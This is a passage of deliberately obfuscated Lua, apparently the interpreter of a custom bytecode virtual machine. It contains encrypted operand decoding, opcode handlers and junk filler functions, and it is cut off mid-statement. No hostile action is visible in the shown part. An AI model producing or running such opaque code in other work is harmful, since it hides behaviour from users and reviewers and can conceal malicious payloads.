w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011001_10111+0B101001011101100110)%0X100))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0B100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0B100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0B100000000))%0b100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011101101010000_00+0b10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0B101001011101100110)%0b100000000))%0X100)%0x1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101_110110101000000+0B10100110000101110111)%0B100_000000))*256-32768;_e=_e+2;bwo[w6]=bwo[w6]-bwo[w6+2];_e=_e+m end local function ep8() bwo[CXt+1]=bwo[CXt] end local function IY() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0B100_000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed4_0+0B10100110000101110111)%0x1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+169830)%256))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%0X100))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0b100_000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0b100000000)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0xa_6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0x29766)%0x100))%0x10_0)%0b10000_0000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%256))*256;_e=_e+2;bwo[w6]=math.floor(bwo[m]/bwo[JNt]) end local function y() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b100000_1100110111+0x29766)%0x10_0))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0B10100110000101110111)%0b100_000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0b101001011101_100110)%0X100))%0x100)%0b10000000_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0X29766)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0xa6_177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%0x10_0))%0b100000_000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;bwo[w6]=-bwo[m] end local function q() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0b100000_000))%0B100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0B1_0100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B101001011101100110)%0X100))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0b100_000000))%0b100000000)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100_110111+169830)%0X1_00))%0X100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0b101001011101100110)%0x100))%0B100000000)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0b100000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0x10_0))*256;_e=_e+2;local _HG0=bwo[w6];local _ka=(JNt-1)*50;local _kCQ=(m==0) and (CXt-w6-1) or m;for _mv=1,_kCQ do _HG0[_ka+_mv]=bwo[w6+_mv] end end local function hKG() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0x100))%0x10_0)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed_40+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0B100000000))%0B1000_00000)%0x10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0X100))%0b100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B101001011101100110)%0X100))%0X100)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa617_7)%0X10_0))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0x29_766)%256))%256)%0x1_00),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed_40+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10000011001_10111+0x297_66)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6177)%256))*256;_e=_e+2;bwo[w6][JkZ(m+1)]=bwo[JNt] end local function mRB()  end local function Jef() bwo[47]=nil end local function uo() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0x29766)%0b100000000))%0X100)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0B100000000))%0b1_00000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa6177)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011001101_11+0X29766)%256))%0b100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+0B101001011101100110)%256))%0X100)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa617_7)%0B1000_00000))*256;_e=_e+2;local _R=bwo[w6];local _HG0=(_R~=nil and _R~=false);if _HG0~=(m~=0) then _e=_e+1+2 end end local function Xx() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B100000110011011_1+0X29766)%256))%0X100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0B10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0B1010010111011_00110)%256))%0b100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0b101001011101100110)%0b100000000))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011101_10101000000+0B10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0x29766)%256))%0x100)%0B100000_000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0b1_00000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%256))%0b100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X297_66)%0x100))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0xa6177)%0B100000_000))*256;_e=_e+2;bwo[w6]=bwo[m]+bwo[JNt] end local function iX() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X297_66)%256))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B101001011101100110)%0b100000000))%0b10000_0000)%0b100_000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0B10_0000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0X29766)%0x100))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6_ed40+0b10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%256))%0X10_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0X100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%256))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0xa6177)%0X1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x83_37+0X29766)%256))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%0x100))*256;_e=_e+2;bwo[w6]=bwo[m]-bwo[JNt] end local function rPH() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%256))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0B10000000_0))%0B10_0000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa6177)%0B1000000_00))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x10_0))%0x100)%0B100_000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa617_7)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0B100000000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0B1010011_0000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa617_7)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29_766)%0x100))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa617_7)%256))*256;_e=_e+2;bwo[w6][JkZ(m+1)]=bwo[JNt] end local function qma() bwo[CXt+1]=bwo[CXt] end local function cHf() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000_001100110111+0B101001011101100110)%0b100000000))%256)%0B10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0x29766)%256))%0x100)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0Xa6_177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%0X10_0))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%0b10000000_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X297_66)%256))%0b1000000_00)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0b10100110000101110111)%0b100000000))*256;_e=_e+2;local _r2=FX[m+1];local _Y=tm6[_r2];local _cn=_Y.Iwa;local _Zo={};for _mv=1,_cn do local _W9D=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0B101001011101100110)%0X100))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0b100000000)); _e=_e+1;local _n3=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b100000110011011_1+0X29766)%256))%0x100)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%0x10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x83_37+0X29766)%256))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%256))*256;_e=_e+2;local _Bf=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101100110)%0X100))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B1010011000010111011_1)%0X1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X297_66)%256))%256)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b10100110000101110111)%256))*256;_e=_e+2;if (_W9D==((0Xf1+0X15f3)-0B101011111_0011) or _W9D==(tc(66,178)+0B111011010-474)) then _Zo[_mv]=bwo[_Bf] else _Zo[_mv]=fjv[_Bf+1] end end;local _Cx=_Y;bwo[w6]=function(...) return w(_Cx,_Zo,...) end end local function _p() bwo[31]=bwo[40] or 0 end local function oL() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0b101001011101100110)%0x100))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%256))%0B100_000000)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0b101001011101100110)%0B100000000))%0x10_0)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+0b101001011101100110)%0b100000000))%256)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6_177)%0x100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0X29766)%0X10_0))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0b100000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%256))*256;_e=_e+2;bwo[w6]=bwo[m]-bwo[JNt] end local function J() local _junk=(_e%7)+1 end local function x4() local _junk=bwo[5];bwo[55]=_junk end local function QBY() bwo[CXt+1]=bwo[CXt] end local function E7() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0b101001011101100_110)%256))%0x10_0)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0x100))%256)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10_100110000101110111)%0B100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%0X100))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%0x10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0B100000000))%0b100000000)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%256))*256;_e=_e+2;bwo[w6]=Xwt[JkZ(m+1)] end local function f3() bwo[CXt+1]=bwo[CXt] end local function xU() bwo[3]=(bwo[59] or 0)+8 end local function S2() bwo[CXt+1]=bwo[CXt] end local function tc6() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8_337+0x29_766)%0X1_00))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa61_77)%0B10000_0000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0X100))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B1010_01011101100110)%0b100000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed4_0+0b10100110000101110111)%0B10000_0000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+169830)%0X100))%0B100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%256))*256;_e=_e+2;bwo[w6][1]=bwo[m] end local function W() local _junk=bwo[35];bwo[12]=_junk end local function qX() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b10000_01100110111+169830)%0X100))%256)%0x1_00),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B1_0100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0b101001011101100110)%0x100))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0b1010011000_0101110111)%0X1_00))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed_40+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0B100000000))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0b10000_0000))*256;_e=_e+2;bwo[w6]=bwo[m][1] end local function rP() bwo[CXt+1]=bwo[CXt] end local function Ft() bwo[CXt+1]=bwo[CXt] end local function Vm() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8_337+169830)%256))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b10100110000101110111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0b101001011101100110)%0B100000000))%0B1000000_00)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6_177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0B100000000))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed4_0+680311)%0x10_0))*256;_e=_e+2;local _r2=FX[m+1];local _Y=tm6[_r2];local _cn=_Y.Iwa;local _Zo={};for _mv=1,_cn do local _W9D=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0x100)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0B10100110000101110111)%256)); _e=_e+1;local _n3=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0B101001011101100110)%0b100000000))%0b10000_0000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6e_d40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0X100))%0X100)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa61_77)%0b100000000))*256;_e=_e+2;local _Bf=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0b101001_011101100110)%256))%0X100)%0b10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B101001100001_01110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0X297_66)%256))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b110_1110110101000000+0Xa6177)%0x10_0))*256;_e=_e+2;if (_W9D==(tc(0B11010000,0b100001)+0xca-202) or _W9D==((0B11110000+0x4eb)-0X4eb)) then _Zo[_mv]=bwo[_Bf] else _Zo[_mv]=fjv[_Bf+1] end end;local _Cx=_Y;bwo[w6]=function(...) return w(_Cx,_Zo,...) end end local function sz() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0X100))%0b100000000)%0B100000_000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa_6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+0X29766)%256))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B110111011010100_0000+680311)%0B100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0b100000000))%0X100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x297_66)%0B10_0000000))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%0B100000_000))*256;_e=_e+2;bwo[w6]=Xwt[JkZ(m+1)] end local function FQ() local _junk=(_e%7)+4 end local function lK() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%256))%0B100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B101001_10000101110111)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0B100000000))%0x1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x2976_6)%0B100000000))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0xa6177)%0b100_000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0X29766)%0b100000000))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B10100110000101110111)%0x100))*256;_e=_e+2;fjv[m+1][1]=bwo[w6] end local function wNe() bwo[18]=bwo[13] or 0 end local function a8() bwo[9]=nil end local function Tc8() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X833_7+0X29766)%0b100000000))%256)%0b1_00000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B1010010111011_00110)%0X100))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110111)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0X100))%0X100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0b10_0000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B10100101_1101100110)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0x100))%0x100)%0B1_00000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;bwo[w6]=bwo[m][JkZ(JNt+1)] end local function p() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%256))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B10000011001_10111+0x29766)%0B100000000))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%0B100000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0b10_100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X2_9766)%0x100))%0b100_000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0xa6177)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%256))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6_ed40+0Xa_6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0b100000000))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa6177)%0b100000000))*256;_e=_e+2;local _N=bwo[w6];local _x1;if m==0 then _x1=CXt-w6-1 else _x1=m-1 end;local _Q1={};for _mv=1,_x1 do _Q1[_mv]=bwo[w6+_mv] end;local _W22={_N(ARt(_Q1,1,_x1))};local _xY=#_W22;if JNt==0 then for _mv=1,_xY do bwo[w6+_mv-1]=_W22[_mv] end;CXt=w6+_xY else local _zK=JNt-1;for _mv=1,_zK do bwo[w6+_mv-1]=_W22[_mv] end end end local function Di() bwo[17]=nil end local function U6() local _junk=(_e%7)+7 end local function tRn() local 